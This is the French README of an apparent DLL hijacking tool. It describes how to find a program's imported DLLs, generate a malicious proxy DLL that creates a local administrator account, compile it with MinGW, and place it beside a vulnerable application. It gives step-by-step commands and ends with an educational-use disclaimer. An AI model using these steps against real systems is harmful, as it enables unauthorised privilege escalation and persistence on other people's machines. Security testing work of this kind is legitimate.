# DLL Hijacker Tool

Ce projet est un outil de DLL Hijacking utilisant la technique de DLL Proxifying.

https://sh0ckfr.com/pages/martine-a-la-recherche-de-la-dll-hijacking-perdue/
https://sh0ckfr.com/pages/martin-et-le-dll-proxying-de-cristal/


Il permet de générer rapidement une DLL malveillante qui exécutera du code (création d'un administrateur local)

## Fonctionnalités

- Identification des DLL importées par un exécutable cible.
- Sélection des DLL ayant le moins de fonctions exportées pour simplifier l'exploitation.
- Génération automatique d'une DLL malveillante basée sur un template.

## Prérequis

- Python 3.x
- Modules Python : `pefile`
- Compilateur MinGW-w64 (pour générer les DLL et les exécutables).

```bash
pip install pefile
sudo apt install mingw-w64
```

## Mode d'emploi

1. **Analyse de l'exécutable** :

   ```bash
   python dllhijacker.py analyse --executable app.exe
   ```
   ```
   Analyse terminée, maintenant cherche et récupère l'une de ces DLL (sur le système cible):
   - user32.dll
   - kernel32.dll
   - advapi32.dll
   ```

2. **Génération de la DLL malveillante** :

   ```bash
   python dllhijacker.py proxify --dllpath "C:\\Windows\\System32\\user32.dll" --dllimage user32.dll --template template.c
   ```

   Compilation :

   ```bash
   x86_64-w64-mingw32-gcc -shared -o release/user32.dll release/user32.c -Wl,--subsystem,windows
   i686-w64-mingw32-gcc -shared -o release/user32.dll release/user32.c -Wl,--subsystem,windows
   ```

3. **Exploitation** :
   Placez `user32.dll` dans le dossier de l'application vulnérable.

4. **Test** :
   Modifiez le chemin dans `loader.c` :
   ```bash
   sed 's/DLLTOTEST/release\/user32.dll/g' -i test/loader.c
   ```
   Compilez et exécutez le test :
   ```bash
   x86_64-w64-mingw32-gcc -o test/loader.exe test/loader.c
   ./test/loader.exe
   ```

## Explication

### Étape 1 : Identifier l'exécutable vulnérable

Une fois l'application vulnérable identifiée, récupérez l'exécutable à analyser.

### Étape 2 : Analyser l'exécutable

Utilisez l'outil `dllhijacker.py` pour identifier les DLL susceptibles d'être exploitées :

```bash
python dllhijacker.py analyse --executable <chemin_de_l_executable>
```

L'outil vous proposera les DLL ayant le moins de fonctions exportées, facilitant ainsi l'exploitation.

### Étape 3 : Générer la DLL malveillante

Une fois une DLL choisie parmi celles proposées :

1. Utilisez la commande suivante pour générer une DLL malveillante :
   ```bash
   python dllhijacker.py proxify --dllpath <chemin_absolu_de_la_DLL> --dllimage <nom_de_la_DLL> --template <chemin_du_template>
   ```
2. L'outil générera un fichier source `.c` et proposera des commandes pour compiler en 32 et 64 bits.
   Exemple pour 64 bits :
   ```bash
   x86_64-w64-mingw32-gcc -shared -o release/<nom_de_la_DLL>.dll release/<nom_de_la_DLL>.c -Wl,--subsystem,windows
   ```
   Exemple pour 32 bits :
   ```bash
   i686-w64-mingw32-gcc -shared -o release/<nom_de_la_DLL>.dll release/<nom_de_la_DLL>.c -Wl,--subsystem,windows
   ```

### Étape 4 : Placer la DLL générée

Placez la DLL malveillante dans le dossier de l'application vulnérable, là où elle pourrait être recherchée par le binaire.

## Tester la DLL générée

Pour vérifier que la DLL générée est correctement chargée par l'exécutable vulnérable, utilisez le fichier de test `loader.c` :

1. Modifiez le chemin de la DLL dans `loader.c` :
   ```bash
   sed 's/DLLTOTEST/<chemin_de_la_DLL>/g' -i test/loader.c
   ```

2. Compilez le fichier `loader.c` en 64 bits :
   ```bash
   x86_64-w64-mingw32-gcc -o test/loader.exe test/loader.c
   ```

3. Compilez le fichier `loader.c` en 32 bits :
   ```bash
   i686-w64-mingw32-gcc -o test/loader.exe test/loader.c -m32
   ```

4. Exécutez `loader.exe` pour tester le chargement de votre DLL.

## Notes

- Cet outil est à des fins éducatives uniquement. Toute utilisation abusive est interdite.
- Assurez-vous d'avoir les permissions nécessaires pour tester cet outil sur des systèmes.

## Avertissement

L'exploitation de vulnérabilités sans autorisation est illégale. Utilisez cet outil uniquement dans un cadre légal, comme des audits de sécurité ou des environnements de test autorisés.
